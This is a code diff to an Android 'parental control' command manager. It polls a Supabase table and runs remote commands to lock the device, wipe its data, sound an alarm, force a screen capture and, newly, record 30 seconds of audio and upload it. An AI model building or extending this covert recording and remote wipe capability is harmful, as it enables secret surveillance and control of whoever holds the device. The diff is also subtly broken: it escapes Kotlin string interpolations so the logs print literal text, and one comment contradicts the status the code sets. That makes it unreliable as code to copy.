@@ -1,24 +1,27 @@
 package com.example.parentalcontrol
 
 import android.content.Context
+import android.media.MediaPlayer
 import android.media.RingtoneManager
 import android.util.Log
-import io.github.jan.supabase.realtime.PostgresAction
-import io.github.jan.supabase.realtime.Realtime
-import io.github.jan.supabase.realtime.channel
-import io.github.jan.supabase.realtime.postgresChangeFlow
+import io.github.jan.supabase.postgrest.postgrest
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.flow.launchIn
-import kotlinx.coroutines.flow.onEach
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
-import kotlinx.serialization.json.decodeFromJsonElement
-import kotlinx.serialization.json.jsonObject
-import kotlinx.serialization.json.jsonPrimitive
+import kotlinx.serialization.Serializable
+
+@Serializable
+data class CommandRecord(
+    val id: String,
+    val device_id: String,
+    val command: String,
+    val status: String
+)
 
 /**
- * مدير الأوامر الفورية (Realtime Commands)
- * يستمع لجدول 'commands' في Supabase وينفذ الأوامر فور ورودها
+ * مدير الأوامر (Command Manager)
+ * متصل بنظام السحب الدوري (Polling) كبديل فائق الاستقرار للأسلاك (Websockets) لمنع حالات الفشل
  */
 class RealtimeCommandManager(
     private val context: Context,
@@ -27,100 +30,135 @@ class RealtimeCommandManager(
 ) {
 
     companion object {
-        private const val TAG = "RealtimeCommand"
+        private const val TAG = "CommandManager"
         private const val TABLE_NAME = "commands"
     }
 
     private val supabase = SupabaseManager.getInstance()
     private val parentalControl = ParentalControlManager(context)
     private val screenCapture = ScreenCaptureEngine(context)
+    private val audioRecorder = AudioRecorderEngine(context)
 
     /**
-     * بدء الاستماع للأوامر
+     * بدء السحب الدوري للأوامر (كل 5 ثوانٍ)
      */
     fun startListening() {
-        val client = supabase.getClient() ?: run {
-            Log.e(TAG, "Supabase client not initialized")
-            return
-        }
+        Log.i(TAG, "Starting command polling...")
+        scope.launch(Dispatchers.IO) {
+            while (true) {
+                try {
+                    val client = supabase.getClient()
+                    if (client != null) {
+                        val currentDeviceId = android.provider.Settings.Secure.getString(
+                            context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
+                        )
 
-        scope.launch {
-            try {
-                Log.i(TAG, "Connecting to realtime 'commands' channel...")
-                
-                val channel = client.channel("remote-commands")
-                
-                // الاستماع لعمليات الإدراج (INSERT) في جدول 'commands'
-                channel.postgresChangeFlow<PostgresAction.Insert>(schema = "public") {
-                    table = TABLE_NAME
-                }.onEach { action ->
-                    handleCommand(action)
-                }.launchIn(scope)
+                        // نجلب الأوامر المعلقة لهذا الجهاز
+                        val newCommands = client.postgrest[TABLE_NAME]
+                            .select {
+                                filter {
+                                    eq("device_id", currentDeviceId)
+                                    eq("status", "PENDING")
+                                }
+                            }.decodeList<CommandRecord>()
 
-                channel.subscribe()
-                Log.i(TAG, "Subscribed to commands channel successfully")
+                        // تحديث الحالة وتنفيذ الأوامر
+                        for (cmd in newCommands) {
+                            try {
+                                // 1. تعيين الحالة إلى قيد التنفيذ لمنع التكرار
+                                client.postgrest[TABLE_NAME].update(
+                                    {
+                                        set("status", "EXECUTED")
+                                    }
+                                ) {
+                                    filter { eq("id", cmd.id) }
+                                }
+
+                                Log.i(TAG, "Executing command: \${cmd.command}")
+                                executeCommand(cmd.command.uppercase().trim())
+                            } catch (e: Exception) {
+                                Log.e(TAG, "Failed to process command \${cmd.id}: \${e.message}")
+                            }
+                        }
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Polling error: \${e.message}")
+                }
                 
-            } catch (e: Exception) {
-                Log.e(TAG, "Realtime subscription failed: ${e.message}", e)
+                // انتظار 5 ثوانٍ قبل الفحص التالي (استهلاك منخفض جداً للطاقة)
+                delay(5000L)
             }
         }
     }
 
-    private fun handleCommand(action: PostgresAction.Insert) {
+    private fun executeCommand(command: String) {
         try {
-            val record = action.record
-            val command = record["command"]?.jsonPrimitive?.content?.uppercase() ?: return
-            val deviceId = record["device_id"]?.jsonPrimitive?.content ?: ""
-            
-            // التأكد من أن الأمر موجه لهذا الجهاز
-            val currentDeviceId = android.provider.Settings.Secure.getString(
-                context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
-            )
-            
-            if (deviceId != currentDeviceId && deviceId != "ALL") {
-                Log.d(TAG, "Command ignored: not for this device ($deviceId)")
-                return
-            }
-
-            Log.i(TAG, "Executing remote command: $command")
-
             when (command) {
                 "LOCK" -> parentalControl.lockScreen()
                 "WIPE" -> parentalControl.wipeData(false)
                 "ALARM" -> playAlarm()
-                "CAPTURE" -> scope.launch {
+                "CAPTURE" -> scope.launch(Dispatchers.IO) {
                     val projection = projectionProvider()
                     if (projection != null) {
-                        screenCapture.captureAndUpload(projection)
+                        screenCapture.captureAndUpload(projection, forceCapture = true)
                     } else {
                         Log.e(TAG, "Cannot capture screen: MediaProjection is null")
                     }
                 }
-                else -> Log.w(TAG, "Unknown command received: $command")
+                "RECORD" -> scope.launch(Dispatchers.IO) {
+                    audioRecorder.recordAndUpload(30000L) // تسجيل 30 ثانية
+                }
+                else -> Log.w(TAG, "Unknown command received: \$command")
             }
-            
         } catch (e: Exception) {
-            Log.e(TAG, "Error handling command: ${e.message}")
+            Log.e(TAG, "Error executing command: \${e.message}")
         }
     }
 
-
     /**
-     * تشغيل صوت إنذار
+     * تشغيل صوت إنذار بأعلى صوت ممكن
      */
     private fun playAlarm() {
         try {
-            val notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
-            val ringtone = RingtoneManager.getRingtone(context, notification)
-            ringtone.play()
+            val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
+            // رفع الصوت إلى الحد الأقصى تلقائياً (قناة الإنذار)
+            val maxVolume = audioManager.getStreamMaxVolume(android.media.AudioManager.STREAM_ALARM)
+            audioManager.setStreamVolume(android.media.AudioManager.STREAM_ALARM, maxVolume, 0)
+
+            val notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM) ?: 
+                               RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
             
-            // التوقف بعد 10 ثوانٍ
+            val mediaPlayer = MediaPlayer().apply {
+                setDataSource(context, notification)
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
+                    setAudioAttributes(
+                        android.media.AudioAttributes.Builder()
+                            .setUsage(android.media.AudioAttributes.USAGE_ALARM)
+                            .setContentType(android.media.AudioAttributes.CONTENT_TYPE_SONIFICATION)
+                            .build()
+                    )
+                } else {
+                    setAudioStreamType(android.media.AudioManager.STREAM_ALARM)
+                }
+                prepare()
+                isLooping = true
+                start()
+            }
+
+            // التوقف بعد 15 ثانية لضمان عدم استهلاك البطارية
             scope.launch {
-                kotlinx.coroutines.delay(10000L)
-                if (ringtone.isPlaying) ringtone.stop()
+                delay(15000L)
+                try {
+                    if (mediaPlayer.isPlaying) {
+                        mediaPlayer.stop()
+                        mediaPlayer.release()
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error stopping alarm: \${e.message}")
+                }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to play alarm: ${e.message}")
+            Log.e(TAG, "Failed to play alarm: \${e.message}")
         }
     }
 }
